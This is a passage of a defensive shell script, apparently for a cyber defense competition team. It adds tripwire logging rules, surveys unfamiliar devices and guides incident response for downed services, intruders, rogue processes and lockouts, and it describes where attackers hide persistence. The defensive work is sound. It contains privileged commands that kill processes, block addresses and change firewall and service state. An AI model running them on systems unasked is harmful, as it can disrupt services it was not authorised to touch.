            printf '%s %s\n' "$tr_m" "$tr_csv" > "$VAULT/trip.txt"; chmod 600 "$VAULT/trip.txt"
            say "Tripwire on: ports $tr_csv log every new connection ($tr_m). Nothing is blocked."
            why "a red team scan touches these ports in the first seconds. The hunt lists who did, with times."
            say "  Your own team's nmap scans trip it too: write them in the notes."
            autonote "tripwire ports on ($tr_csv, $tr_m): logs scanners, blocks nothing"
            byhand "journalctl -k | grep first30-trip   (or: dmesg | grep first30-trip)" ;;
        off)
            [ -s "$VAULT/trip.txt" ] || { say "Tripwire is not on."; return 0; }
            read -r tr_m tr_csv < "$VAULT/trip.txt"
            case "$tr_m" in
                firewalld) firewall-cmd --direct --remove-rule ipv4 filter INPUT 0 -p tcp -m multiport --dports "$tr_csv" --syn -m limit --limit 20/min -j LOG --log-prefix 'first30-trip: ' >/dev/null 2>&1 ;;
                iptables) while iptables -D INPUT -p tcp -m multiport --dports "$tr_csv" --syn -m limit --limit 20/min -j LOG --log-prefix 'first30-trip: ' 2>/dev/null; do :; done ;;
                nft) nft -a list chain inet first30 in 2>/dev/null | awk '/first30-trip/ {print $NF}' | while read -r tr_h; do nft delete rule inet first30 in handle "$tr_h"; done ;;
            esac
            rm -f "$VAULT/trip.txt"
            say "Tripwire off."
            autonote "tripwire ports off" ;;
        *)
            if [ -s "$VAULT/trip.txt" ]; then say "Tripwire: on ($(cat "$VAULT/trip.txt"))"; else say "Tripwire: off. Turn it on: sh first30.sh trip on"; fi
            say "Hits in the last 24 hours (packets, address, ports):"
            trip_hits '-24h' | sed 's/^/  /' ;;
    esac
}
chk_trip() {
    [ -s "$VAULT/trip.txt" ] || return 0
    sec trip "Tripwire ports: who scanned this box (T1046)"
    ct_s=$(date -r "$VAULT/.stamp_$HOST" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
    ct_all="$VAULT/.trip_lines.$$"
    klog "${ct_s:--2h}" > "$ct_all.raw"
    grep 'first30-trip' "$ct_all.raw" > "$ct_all"
    rm -f "$ct_all.raw"
    if [ "$KLOG_SRC" = all ]; then
        # no time filter here: show only the lines that are new since the last hunt
        ct_seen=$(cat "$VAULT/.trip_seen_$HOST" 2>/dev/null); case "$ct_seen" in ''|*[!0-9]*) ct_seen=0 ;; esac
        ct_n=$(grep -c . "$ct_all")
        [ "$ct_n" -lt "$ct_seen" ] && ct_seen=0
        say "$ct_n" > "$VAULT/.trip_seen_$HOST"
        ct_h=$(tail -n "+$((ct_seen + 1))" "$ct_all" | trip_sum)
    else
        ct_h=$(trip_sum < "$ct_all")
    fi
    rm -f "$ct_all"
    if [ -n "$ct_h" ]; then
        say "  since ${ct_s:-two hours ago} (packets, address, tripwire ports touched):"
        say "$ct_h" | sed 's/^/    /'
        flag
        nxt "is it your scoring engine, the Black Team box, or a teammate's scan? If not: sh first30.sh block <address>"
        say "        Write the address and time in your notes: incident reports need the attacker's address."
    else
        ok "nobody touched the tripwire ports ($(cut -d' ' -f2 "$VAULT/trip.txt"))"
    fi
}

# ---------------------------------------------------------------- scout (odd devices)
# For a device the main checks were not built for: a router or firewall (pfSense,
# OPNsense, OpenWrt, VyOS), Chrome OS (last year's "tick" was a Chrome OS box),
# Tiny Core (Invitational 2's roadrunner), Alpine, BSD, Android, or anything with a
# shell. Only plain commands that exist almost everywhere, and each may fail safely.
scout_kind() {
    sk_u=$(uname -s 2>/dev/null)
    if grep -q -i pfsense /etc/platform 2>/dev/null; then say pfsense
    elif have opnsense-version || [ -d /usr/local/opnsense ]; then say opnsense
    elif [ "$sk_u" = FreeBSD ] || [ "$sk_u" = OpenBSD ] || [ "$sk_u" = NetBSD ]; then say bsd
    elif [ "$sk_u" = Darwin ]; then say macos
    elif [ -f /etc/openwrt_release ]; then say openwrt
    elif [ -d /opt/vyatta ]; then say vyos
    elif grep -q CHROMEOS_RELEASE /etc/lsb-release 2>/dev/null; then say chromeos
    elif [ -f /usr/share/doc/tc/release.txt ] || [ -d /usr/local/tce.installed ]; then say tinycore
    elif have getprop && [ -n "$(getprop ro.build.version.release 2>/dev/null)" ]; then say android
    elif [ -f /etc/alpine-release ]; then say alpine
    elif [ -f /etc/slackware-version ]; then say slackware
    elif [ "$sk_u" = Linux ]; then say linux
    else say unknown; fi
}
sc_sec() { say ""; say "== $1"; say "   (by hand: $2)"; }

scout_body() {
    sc_k=$(scout_kind)
    say "== Scout report for $HOST: a $sc_k device   $(date)"
    say "   Read only. For devices the main checks were not built for. Every section shows its plain command,"
    say "   so you can run it yourself on the next odd device."
    sc_sec "What is this device" "uname -a ; cat /etc/*release"
    uname -a 2>/dev/null | sed 's/^/  /'
    cat /etc/os-release /etc/openwrt_release /etc/alpine-release /etc/slackware-version /etc/version /etc/platform 2>/dev/null | head -8 | sed 's/^/  /'
    grep CHROMEOS_RELEASE_DESCRIPTION /etc/lsb-release 2>/dev/null | sed 's/^/  /'
    [ "$sc_k" = android ] && say "  Android $(getprop ro.build.version.release 2>/dev/null), $(getprop ro.product.model 2>/dev/null)"
    say "  tools here: $(for t in ss netstat sockstat ps lsof iptables nft pfctl uci systemctl rc-service initctl journalctl logread sha256sum python3 busybox; do have "$t" && printf '%s ' "$t"; done)"
    sc_sec "Accounts: root-level ones, and every account that can log in" "awk -F: '\$3 == 0' /etc/passwd ; grep -v -E 'nologin|false' /etc/passwd"
    awk -F: '$3 == 0 {print "  root-level: " $1} $3 != 0 && $7 !~ /(nologin|false|sync|shutdown|halt)$/ {print "  can log in: " $1 " (" $7 ")"}' /etc/passwd 2>/dev/null
    if [ -f /conf/config.xml ]; then
        say "  web GUI users in /conf/config.xml: $(awk '/<user>/ {u = 1} u && /<name>/ {gsub(/.*<name>|<\/name>.*/, ""); printf "%s ", $0; u = 0}' /conf/config.xml)"
        grep -q '<authorizedkeys>' /conf/config.xml && say "  SSH keys are stored in config.xml (<authorizedkeys>): check every one is your team's"
    fi
    sc_sec "Listening ports (what can be reached from the network)" "sockstat -4l (BSD), ss -tulnp, or netstat -an | grep LISTEN"
    if have sockstat; then sockstat -4 -l 2>/dev/null | head -30 | sed 's/^/  /'
    elif have ss; then ss -tulnp 2>/dev/null | head -30 | sed 's/^/  /'
    elif netstat -tuln >/dev/null 2>&1; then netstat -tulnp 2>/dev/null | head -30 | sed 's/^/  /'
    else netstat -an 2>/dev/null | grep -i listen | head -30 | sed 's/^/  /'; fi
    sc_sec "Running programs" "ps aux   (BusyBox: ps w)"
    { ps aux 2>/dev/null || ps w 2>/dev/null || ps 2>/dev/null; } | grep -v -E '[[:space:]]\[[^]]+\][[:space:]]*$' | head -45 | cut -c1-160 | sed 's/^/  /'
    sc_sec "Starts at boot" "depends on the device: see the list below"
    case "$sc_k" in
        pfsense|opnsense|bsd) grep -E '_enable="?(YES|yes)' /etc/rc.conf /etc/rc.conf.local 2>/dev/null | sed 's/^/  /'; ls -la /usr/local/etc/rc.d 2>/dev/null | sed 's/^/  /' | head -20 ;;
        openwrt) for f in /etc/rc.d/S*; do [ -e "$f" ] && printf '  %s\n' "$f"; done; say "  /etc/rc.local:"; grep -v '^#' /etc/rc.local 2>/dev/null | sed 's/^/    /' ;;
        chromeos) initctl list 2>/dev/null | grep -E 'start/running' | head -40 | sed 's/^/  /' ;;
        tinycore) for f in /opt/bootlocal.sh /opt/bootsync.sh /opt/.filetool.lst /etc/sysconfig/tcedir/onboot.lst; do [ -f "$f" ] && { say "  $f:"; sed 's/^/    /' "$f" | head -20; }; done ;;
        alpine) rc-update show 2>/dev/null | sed 's/^/  /'; ls -la /etc/local.d 2>/dev/null | sed 's/^/  /' ;;
        android) say "  third-party apps: $(pm list packages -3 2>/dev/null | cut -d: -f2 | tr '\n' ' ')" ;;
        *) if have systemctl; then systemctl list-unit-files --state=enabled --no-legend 2>/dev/null | head -40 | sed 's/^/  /'; fi
           ls -la /etc/init.d 2>/dev/null | head -30 | sed 's/^/  /' ;;
    esac
    sc_sec "Scheduled jobs" "crontab -l ; cat /etc/crontab ; ls /etc/cron.d /etc/crontabs /var/cron/tabs"
    { crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; cat /etc/crontabs/* /var/spool/cron/crontabs/* /var/cron/tabs/* 2>/dev/null; } | grep -v -E '^[[:space:]]*(#|$)' | head -25 | sed 's/^/  /'
    grep -A4 '<cron>' /conf/config.xml 2>/dev/null | grep '<command>' | sed 's/^/  config.xml cron: /' | head -10
    sc_sec "SSH keys that let someone in without a password" "find / -name 'authorized_keys*'"
    find / -xdev \( -name 'authorized_keys*' -o -path '/etc/dropbear/authorized_keys' \) -type f 2>/dev/null | head -10 | while read -r sc_f; do
        say "  $sc_f: $(grep -c . "$sc_f" 2>/dev/null) key(s)"; done
    sc_sec "Firewall and port forwards (NAT)" "pfctl -sr / -sn (BSD), iptables -S / -t nat -S, nft list ruleset, uci show firewall"
    if have pfctl; then pfctl -sr 2>/dev/null | head -25 | sed 's/^/  rule: /'; pfctl -sn 2>/dev/null | head -15 | sed 's/^/  nat: /'
    elif have iptables && iptables -S >/dev/null 2>&1; then iptables -S 2>/dev/null | head -25 | sed 's/^/  /'; iptables -t nat -S 2>/dev/null | grep -E 'DNAT|REDIRECT|MASQ' | head -15 | sed 's/^/  nat: /'
    elif have nft; then nft list ruleset 2>/dev/null | head -40 | sed 's/^/  /'; fi
    have uci && uci show firewall 2>/dev/null | grep -E 'redirect|\.dest_port|\.src_dport' | head -15 | sed 's/^/  /'
    sc_sec "Files changed in the last day" "find /etc /root /home /tmp -xdev -type f -mtime -1"
    find /etc /root /home /tmp /var/tmp /usr/local/etc /conf /opt -xdev -type f -mtime -1 2>/dev/null | grep -v -F "$VAULT" | head -40 | sed 's/^/  /'
    sc_sec "Network setup" "ifconfig -a or ip addr ; netstat -rn or ip route"
    { ip -4 addr 2>/dev/null || ifconfig -a 2>/dev/null; } | grep -E 'inet |^[0-9a-z]' | head -20 | sed 's/^/  /'
    { ip route 2>/dev/null || netstat -rn 2>/dev/null; } | head -12 | sed 's/^/  /'
    scout_checklist "$sc_k"
}

scout_checklist() {
    say ""
    say "== Your first 30 minutes on this $1 device (commands to type yourself)"
    say "   Before anything: do NOT block the scoring engine or the Black Team box, and write down the default"
    say "   settings you change. A router or firewall reset costs 100 points (last year's packet)."
    case "$1" in
        pfsense|opnsense)
            say "  1. Back up the config: cp /conf/config.xml /conf/config.xml.first30 (and download it in the web GUI:"
            say "     Diagnostics > Backup & Restore). If a change goes wrong, restore that file."
            say "  2. Change the web GUI admin password (System > User Manager) and root's (passwd). Remove users you do not know."
            say "  3. Firewall > Rules > WAN: no 'any to any' pass rules. Firewall > NAT: only scored services forwarded."
            say "  4. Live connections: pfctl -ss | grep <address>. Cut an attacker's connections: pfctl -k <address>"
            say "  5. Packages red team could add: pkg info. Cron jobs: System > Cron (or grep -A4 '<cron>' /conf/config.xml)."
            say "  6. pfSense console option 3 resets the GUI password: if you lose the GUI, that is the way back in." ;;
        openwrt)
            say "  1. Back up: sysupgrade -b /tmp/backup.tar.gz, then copy it to another box (scp)."
            say "  2. passwd (root has NO password on a fresh OpenWrt). SSH settings: uci show dropbear"
            say "  3. Port forwards: uci show firewall | grep redirect. Remove one: uci delete firewall.<name>; uci commit firewall; /etc/init.d/firewall restart"
            say "  4. Logs live in memory: logread (and logread -f to watch). Boot script: /etc/rc.local. Cron: /etc/crontabs/root" ;;
        vyos)
            say "  1. Back up: cp /config/config.boot /config/config.boot.first30"
            say "  2. show configuration commands | grep -E 'nat|firewall|login|service'  (who can log in, what is forwarded)"
            say "  3. Change passwords in configure mode: set system login user <name> authentication plaintext-password ..., commit, save" ;;
        chromeos)
            say "  1. Is it in developer mode? crossystem cros_debug (1 = a root shell is possible, also for red team)."
            say "  2. The system disk is read-only and signed; what red team adds goes in /usr/local and /home: ls -la /usr/local/bin"
            say "  3. Services: initctl list. Firewall: iptables -S. Logs: /var/log/messages and /var/log/secure"
            say "  4. In developer mode, set a password for the chronos account: chromeos-setdevpasswd" ;;
        tinycore)
            say "  1. Changes VANISH at reboot unless saved: files listed in /opt/.filetool.lst are saved by: filetool.sh -b"
            say "  2. Red team hides in: /opt/bootlocal.sh and /opt/bootsync.sh (run at boot), /opt/.filetool.lst (what survives),"
            say "     and onboot.lst (extensions loaded at boot). Read all four (shown above)."
            say "  3. After changing passwords: make sure etc/shadow is in /opt/.filetool.lst, then filetool.sh -b"
            say "  4. The main script still works here: sh first30.sh all" ;;
        alpine)
            say "  1. Boot scripts: ls -la /etc/local.d (*.start files run at boot). Services: rc-status -a ; rc-update show"
            say "  2. Changed package files: apk audit --system. Cron: /etc/crontabs and /etc/periodic"
            say "  3. Diskless Alpine (common on routers) keeps changes only after: lbu commit   (lbu status shows what changed)"
            say "  4. The main script works here: sh first30.sh all" ;;
        bsd)
            say "  1. Services at boot: grep _enable /etc/rc.conf. Ports: sockstat -4l. Packages: pkg info"
            say "  2. Firewall: pfctl -sr (pf) or ipfw list. Users: cat /etc/passwd ; pw usershow -a" ;;
        android)
            say "  1. Third-party apps (above) are where red team hides. Remove one: pm uninstall <package> (ask your lead)."
            say "  2. Open ports above: an app listening on the network is unusual on a phone or tablet." ;;
        slackware|linux)
            say "  The main script works here: sh first30.sh all, then the hunt every 30 minutes." ;;
        *)
            say "  1. Find out what it is (the first section). Search the exact OS name plus 'default password' and 'hardening'."
            say "  2. Change the default passwords, back up its config, and find its management page and ports." ;;
    esac
    say "  Then write what you did: sh first30.sh note \"...\"  (or on paper, if this script cannot run here)."
}

do_scout() {
    case "$(uname -s 2>/dev/null)" in Linux) ;; *) PATH=$PATH:/usr/local/sbin:/usr/local/bin; export PATH ;; esac
    if [ "$(id -u)" != 0 ]; then say "Run it as root for the full picture (sudo sh first30.sh scout)."; fi
    umask 077
    mkdir -p "$VAULT" 2>/dev/null && chmod 700 "$VAULT" 2>/dev/null
    sc_out="$VAULT/scout_${HOST}_$TS.txt"
    scout_body 2>&1 | tee "$sc_out"
    chmod 600 "$sc_out" 2>/dev/null
    say ""
    say "Saved: $sc_out"
}

# ---------------------------------------------------------------- SOS
# The "something is wrong RIGHT NOW" button. It asks what you were doing (so you
# can get back to it), what is wrong, then walks the fix one step at a time:
# what it found, what that means, what to do, and it does the safe part when you
# type yes. At the end: notes, incident facts, PCR and a line for your team.
# The playbook it follows is last year's 20 combat scenarios, automated.
systemd_up() { [ -d /run/systemd/system ]; }   # systemd is really running (not just installed)
sv_unit() {   # the systemd unit (or init script) for a name or port
    case "$1" in
        22) set -- ssh sshd ;; 80|443) set -- apache2 httpd nginx lighttpd caddy ;; 25|465|587) set -- postfix exim4 exim sendmail ;;
        110|143|993|995) set -- dovecot ;; 21) set -- vsftpd proftpd pure-ftpd ;; 53) set -- named bind9 unbound dnsmasq systemd-resolved ;;
        3306) set -- mariadb mysql mysqld ;; 5432) set -- postgresql ;; 389|636) set -- slapd ;; 139|445) set -- smbd smb samba-ad-dc ;;
        3389) set -- xrdp ;; 161) set -- snmpd ;; 2049) set -- nfs-server nfs-kernel-server ;; 8080|8443) set -- tomcat tomcat9 tomcat10 jenkins ;;
        6379) set -- redis-server redis ;; 27017) set -- mongod ;; 88|464) set -- krb5kdc samba-ad-dc ;;
    esac
    for su_n in "$@"; do
        if systemd_up && systemctl list-unit-files --no-legend 2>/dev/null | awk '{print $1}' | grep -q -x "$su_n.service"; then say "$su_n.service"; return 0; fi
        for su_s in "/etc/init.d/$su_n" "/etc/rc.d/rc.$su_n"; do [ -f "$su_s" ] && { say "$su_s"; return 0; }; done
    done
    if systemd_up; then systemctl list-unit-files --type=service --no-legend 2>/dev/null | awk '{print $1}' | grep -i -m 1 -F "$1"
    elif have rc-service && rc-service --exists "$1" 2>/dev/null; then say "/etc/init.d/$1"; fi
}
sv_cfgtest() {   # test a service's config: prints the result, 0 = fine, 1 = broken, 2 = no test known
    case "${1%.service}" in
        nginx) st_c='nginx -t' ;; apache2) st_c='apache2ctl -t' ;; httpd) st_c='httpd -t' ;; ssh|sshd) st_c="$(find_sshd) -t" ;;
        named|bind9) st_c='named-checkconf' ;; postfix) st_c='postfix check' ;; dovecot) st_c='doveconf -n' ;;
        smbd|smb|samba-ad-dc) st_c='testparm -s' ;; unbound) st_c='unbound-checkconf' ;; dnsmasq) st_c='dnsmasq --test' ;;
        slapd) st_c='slaptest -u' ;; haproxy) st_c='haproxy -c -f /etc/haproxy/haproxy.cfg' ;; squid) st_c='squid -k parse' ;;
        *php*fpm*) st_c="$(ls /usr/sbin/php-fpm* /usr/sbin/php*-fpm 2>/dev/null | head -1) -t" ;;
        *) return 2 ;;
    esac
    have "${st_c%% *}" || return 2
    # shellcheck disable=SC2086
    st_o=$(tmo $st_c 2>&1)
    st_r=$?
    st_t=$(printf '%s\n' "$st_o" | grep -v -E '^[[:space:]]*$' | tail -2 | tr '\n' ' ')
    [ "$st_r" = 0 ] && [ -z "$st_t" ] && st_t=OK
    say "  config test ($st_c): $st_t"
    [ "$st_r" = 0 ] && return 0
    return 1
}

sos_service() {
    say ""
    say "== A scored service is down"
    ask "Which one? A name (nginx, apache2, ssh, mariadb, dovecot, vsftpd...) or its port number (like 80):"
    ss_n=$ANS
    [ -n "$ss_n" ] || return 0
    ss_port=''
    case "$ss_n" in *[!0-9]*) ;; *) ss_port=$ss_n ;; esac
    if [ -n "$ss_port" ]; then
        ss_l=$( { ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null; } | grep -E "[:.]${ss_port}[[:space:]]")
        if [ -n "$ss_l" ]; then say "  Port $ss_port is open: $(printf '%s' "$ss_l" | head -1 | tr -s ' ')"
            say "  So the service runs here. If the scoreboard still says down: a firewall (here or the router), the"
            say "  login the check uses (a changed password: PCR?), or the page/content itself (defaced, deleted)."
        else say "  NOTHING listens on port $ss_port. The service is stopped, crashed, or moved to another port."; fact "port $ss_port: nothing listening"; fi
    fi
    ss_u=$(sv_unit "$ss_n")
    if [ -z "$ss_u" ]; then
        say "  Cannot find a service named $ss_n here. List them: systemctl list-units --type=service (or rc-status, ls /etc/rc.d)"
        return 0
    fi
    say "  The service: $ss_u"
    ss_txt=''
    case "$ss_u" in
        /*) ss_txt=$("$ss_u" status 2>&1); say "  status: $(printf '%s' "$ss_txt" | head -2 | tr '\n' ' ')" ;;
        *)
            ss_a=$(systemctl is-active "$ss_u" 2>/dev/null); ss_e=$(systemctl is-enabled "$ss_u" 2>/dev/null)
            say "  state: $ss_a (at boot: $ss_e)"
            fact "$ss_u was $ss_a ($ss_e)"
            ss_txt=$(systemctl status "$ss_u" --no-pager -n 0 2>&1; journalctl -u "$ss_u" -n 15 --no-pager -q 2>/dev/null)
            say "  last log lines:"
            journalctl -u "$ss_u" -n 8 --no-pager -q 2>/dev/null | cut -c1-200 | sed 's/^/    /'
            if [ "$ss_e" = masked ]; then
                say "  It is MASKED: systemd refuses to start it. Red team does this."
                yes_ask "Unmask it?" && systemctl unmask "$ss_u" && autonote "unmasked $ss_u" && fact "unmasked $ss_u"
            fi
            ss_x=$(systemctl show -p ExecStart "$ss_u" 2>/dev/null | sed -n 's/.*path=\([^ ;]*\).*/\1/p' | head -1)
            if [ -n "$ss_x" ] && [ ! -x "$ss_x" ]; then
                say "  Its program $ss_x is MISSING or not executable (status 203/EXEC). Red team deleted it."
                ss_rc=$(reinstall_cmd "$ss_x") && { say "  Put it back: $ss_rc"; yes_ask "Run that now (needs the box's package repos)?" && $ss_rc && autonote "reinstalled for $ss_u: $ss_rc"; }
            fi
            ss_usr=$(systemctl show -p User "$ss_u" 2>/dev/null | cut -d= -f2)
            [ -n "$ss_usr" ] && ! getent passwd "$ss_usr" >/dev/null 2>&1 && say "  It runs as '$ss_usr', and that account is GONE (status 217/USER). Recreate it: useradd -r -M -s /usr/sbin/nologin $ss_usr"
            ;;
    esac
    sv_cfgtest "$(basename "$ss_u")"
    ss_cr=$?
    [ "$ss_cr" = 1 ] && { say "  The config is BROKEN. Put back the start-of-game copy: sh first30.sh restore <config file>"
        say "  (the error above names the file and line). Last year's playbook scenario 1: a poisoned config."; fact "config test failed for $ss_u"; }
    ss_d=$(klog -1h | tail -n 3000 | grep -E 'apparmor="DENIED"|avc: +denied' | grep -i -F "${ss_n%%.*}" | tail -3)
    [ -n "$ss_d" ] && { say "  AppArmor/SELinux is BLOCKING it:"; say "$ss_d" | cut -c1-220 | sed 's/^/    /'; }
    df -P / /var 2>/dev/null | awk 'NR > 1 && $5 + 0 >= 95 {print "  The disk " $6 " is " $5 " full: services cannot write. Free space first (du -xh " $6 " | sort -h | tail)."}' | sort -u
    if [ -n "$ss_port" ] && have iptables && iptables -S INPUT 2>/dev/null | grep -q -E -- "--dport $ss_port .*-j (DROP|REJECT)"; then
        say "  The firewall on THIS box drops port $ss_port:"; iptables -S INPUT | grep -E -- "--dport $ss_port " | sed 's/^/    /'
    fi
    if printf '%s' "$ss_txt" | grep -q -i -E 'fail|error|denied|exited|inactive|dead|not running|stopped|masked'; then
        say "  What the messages mean:"
        decode_error "$ss_txt" | head -6
    else
        say "  The service looks healthy on this box."
    fi
    domain_detect
    [ -n "$DOM" ] && case "$ss_n" in ssh*|22|*sssd*) say "  This box is in the domain $DOM: SSH logins for domain users need AD. Checking it:"; chk_domain ;; esac
    if [ "$ss_cr" != 1 ] && yes_ask "Restart $ss_u now? (if it is SSH, keep this session open)"; then
        case "$ss_u" in /*) "$ss_u" restart >/dev/null 2>&1 ;; *) systemctl restart "$ss_u" 2>&1 | head -3 ;; esac
        sleep 2
        case "$ss_u" in /*) say "  now: $("$ss_u" status 2>&1 | head -1)" ;; *) say "  now: $(systemctl is-active "$ss_u" 2>/dev/null)" ;; esac
        autonote "SOS: restarted $ss_u"
        fact "restarted $ss_u: now $(systemctl is-active "$ss_u" 2>/dev/null)"
    fi
    say "  Check the scoreboard in 1-2 minutes (the checks run every couple of minutes)."
}

sos_many() {
    say ""
    say "== Many services went red at once: find the ONE thing they share"
    why "one shared cause (AD, DNS, the firewall, a database, single sign-on) takes many services down at"
    say "        once. Fixing them one by one wastes the time. At Invitational 2 it was AD; last year the DC."
    sm_gw=$(ip route 2>/dev/null | awk '/^default/ {print $3; exit}')
    say "  1. This box's network: default gateway ${sm_gw:-NONE}"
    [ -z "$sm_gw" ] && say "     No default route: this box cannot answer anyone outside its network. Compare: ip route"
    say "  2. DNS: servers $(awk '/^nameserver/ {printf "%s ", $2}' /etc/resolv.conf 2>/dev/null)"
    domain_detect
    if [ -n "$DOM" ]; then
        if [ -n "$(resolve4 "$DOM")" ]; then say "     the domain $DOM resolves: yes"; else say "     the domain $DOM does NOT resolve: DNS is broken, and so is every login that needs AD"; fi
    fi
    say "  3. Disk space:"
    df -P 2>/dev/null | awk 'NR > 1 && $5 + 0 >= 90 {print "     FULL: " $6 " " $5}'
    say "  4. The domain (AD), if this box uses it:"
    if [ -n "$DOM" ]; then chk_domain; else say "     this box is not in a domain"; fi
    say "  5. This box's firewall (first lines):"
    { iptables -S 2>/dev/null | head -4; nft list ruleset 2>/dev/null | grep -m 3 policy; } | sed 's/^/     /'
    say "  6. Databases on this box:"
    sm_l=" $(listen_ports) "
    for sm_p in 3306 5432 27017 6379; do case "$sm_l" in *" $sm_p "*) say "     port $sm_p is listening" ;; esac; done
    say ""
    say "  If this box looks fine, the shared cause is somewhere else. In this order:"
    say "    - AD on the DC: deleted, locked or disabled users (sh first30.sh ad from here, or menu 17)"
    say "    - DNS (the DC usually), the router or firewall, single sign-on (Keycloak), a shared database, a"
    say "      password vault (HashiCorp Vault rotated app passwords at Invitational 2)"
    say "  Tell your lead which services went red and when: the time points at the cause."
    fact "many services red: checked network, DNS, disk, domain, firewall"
}

sos_someone() {
    say ""
    say "== Someone else is on this box"
    kick_show
    say "  Recent logins (the last 8 that worked):"
    auth_log 2>/dev/null | grep -E 'Accepted (password|publickey)' | tail -8 | sed 's/^/    /'
    say "  Your own session: $(tty 2>/dev/null) from ${SSH_CLIENT%% *}"
    ask "Is one of these NOT your team? Type its address, account or terminal (like pts/2), or Enter for none:"
    [ -n "$ANS" ] || return 0
    do_kick "$ANS"
    say "  Next: they got in with a password or a key. Change that account's password (PCR if it is scored),"
    say "  check its authorized_keys, then run the hunt for what they left behind."
}

sos_pid() {   # deal with one process
    sp=$1
    [ -d "/proc/$sp" ] || { say "  No process $sp."; return 0; }
    sp_x=$(readlink "/proc/$sp/exe" 2>/dev/null)
    sp_pp=$(awk '/^PPid:/ {print $2}' "/proc/$sp/status" 2>/dev/null)
    say "  pid $sp: $(tr '\0' ' ' < "/proc/$sp/cmdline" 2>/dev/null | cut -c1-200)"
    say "    program: ${sp_x:-?}   account: $(ps -o user= -p "$sp" 2>/dev/null | tr -d ' ')   running for: $(ps -o etime= -p "$sp" 2>/dev/null | tr -d ' ')"
    say "    started by: pid $sp_pp ($(cat "/proc/$sp_pp/comm" 2>/dev/null))"
    say "    connections: $(conns | awk -v p="$sp" '$5 == p {printf "%s:%s ", $2, $3}')"
    from_package "${sp_x% (deleted)}"
    [ $? = 1 ] && say "    NO package installed this program."
    fact "process $sp: $(tr '\0' ' ' < "/proc/$sp/cmdline" 2>/dev/null | cut -c1-150) (program ${sp_x:-?})"
    say "  The safe order: 1 freeze it, 2 save evidence, 3 remove what restarts it, 4 kill it."
    why "freezing (kill -STOP) stops it doing anything, but its watchdog still sees it alive, so it does"
    say "        not start a new copy while you remove the cron job or service that would bring it back."
    yes_ask "Freeze pid $sp and save evidence?" || return 0
    kill -STOP "$sp" 2>/dev/null && say "    frozen" && fact "froze pid $sp"
    ( do_evidence "/proc/$sp/exe" ) 2>/dev/null | grep -E 'copy|sha256|named in|    /' | head -12
    sp_n=$(basename "${sp_x% (deleted)}")
    say "  What starts it again (look at these, then remove the line or the service):"
    grep -r -l -F -- "$sp_n" /etc/systemd/system /lib/systemd/system /etc/cron* /var/spool/cron /etc/crontabs /etc/rc.local /etc/init.d \
        /etc/rc.d /etc/local.d /etc/profile.d /root/.bashrc /home/*/.bashrc /etc/inittab 2>/dev/null | head -8 | sed 's/^/    /'
    if yes_ask "Kill pid $sp now?"; then kill -9 "$sp" 2>/dev/null && say "    killed" && fact "killed pid $sp"; autonote "SOS: froze, saved and killed pid $sp ($sp_x)"; fi
    for sp_ip in $(conns | awk -v p="$sp" '$5 == p {print $2}' | sort -u); do
        case "$sp_ip" in 127.*|::1) continue ;; esac
        yes_ask "It talked to $sp_ip. Block that address?" && ( do_block "$sp_ip" ) | grep -E 'blocked|skipped'
    done
}

sos_program() {
    say ""
    say "== A strange program, high CPU, or something calling out"
    say "  Top CPU right now:"
    { ps -eo pid,user,pcpu,etime,args --sort=-pcpu 2>/dev/null || ps -o pid,user,args 2>/dev/null; } | head -8 | cut -c1-160 | sed 's/^/    /'
    [ -n "$PTAB" ] || proc_table
    LPORTS=$(listen_ports)
    chk_exe
    chk_c2
    chk_procs
    ask "Type a PID to deal with (from the lists above), or Enter for none:"
    case "$ANS" in ''|*[!0-9]*) return 0 ;; esac
    sos_pid "$ANS"
}

sos_accounts() {
    say ""
    say "== Accounts and passwords"
    chk_accounts
    chk_sudo
    chk_keys
    say "  Locked or password-less local accounts (passwd -S; L = locked, NP = no password):"
    awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd | while read -r sa_u; do
        sa_s=$(passwd -S "$sa_u" 2>/dev/null | awk '{print $2}')
        case "$sa_s" in L|LK|NP) say "    $sa_u: $sa_s" ;; esac
    done
    domain_detect
    [ -n "$DOM" ] && chk_domain
    say "  Fixes:"
    say "    a local account locked: passwd -u <name> ; a forgotten password: passwd <name> (then a PCR if scored)"
    say "    DOMAIN users deleted, locked or disabled: AD rescue from this box (menu 17)"
    if yes_ask "Open AD rescue now?"; then ( do_ad ); fi
}

sos_files() {
    say ""
    say "== Files changed: a defaced site, a changed config, a ransom note"
    sf_ref="$VAULT/.stamp_$HOST"; [ -f "$sf_ref" ] || sf_ref=$BASE
    if [ -f "$sf_ref" ]; then
        say "  Changed since $(date -r "$sf_ref" '+%H:%M') in web roots and /etc (newest last):"
        changed_files "$sf_ref" | grep -E '/(var/www|srv|etc|usr/share/nginx|opt)/' | tail -20 | sed 's/^/    /'
    fi
    chk_web
    chk_ransom
    say "  Put a file or folder back from the start-of-game backup (the bad copy is saved as evidence first):"
    ask "Full path to restore (like /var/www/html/index.php), or Enter for none:"
    [ -n "$ANS" ] && do_restore "$ANS"
}

sos_lockout() {
    say ""
    say "== Locked out of SSH or root: why, and how to get back in"
    sl_b=$(find_sshd); sl_c=$(find_cfg)
    if [ -n "$sl_b" ]; then
        if sl_t=$("$sl_b" -t 2>&1); then say "  sshd config: OK"
        else say "  sshd config is BROKEN: $sl_t"; say "    sshd will not start. Fix the line it names, or restore it: sh first30.sh restore $sl_c"; fi
        case " $(listen_ports) " in *" 22 "*) say "  sshd listens on 22: yes" ;; *) say "  NOTHING listens on 22 (another port? grep -i ^port $sl_c)" ;; esac
        "$sl_b" -T 2>/dev/null | grep -i -E '^(port|permitrootlogin|passwordauthentication|pubkeyauthentication|allowusers|allowgroups|denyusers|denygroups|maxauthtries) ' | sed 's/^/    /'
    fi
    [ -f /etc/nologin ] && say "  /etc/nologin EXISTS: only root may log in while it is there. Red team trick. Remove it: rm /etc/nologin"
    grep -v -E '^[[:space:]]*(#|$)' /etc/hosts.deny 2>/dev/null | grep -i -E 'ALL|sshd' | sed 's/^/  hosts.deny blocks: /'
    if have iptables && iptables -S INPUT 2>/dev/null | grep -q -E -- '--dport 22 .*-j (DROP|REJECT)'; then say "  The firewall here drops port 22."; fi
    say "  PAM (who may log in): the hunt's PAM and package checks show a changed or planted PAM file."
    have faillock && say "  faillock (too many tries): $(faillock 2>/dev/null | grep -c -E '^[0-9]{4}-' ) recent failures recorded. Reset one: faillock --user <name> --reset"
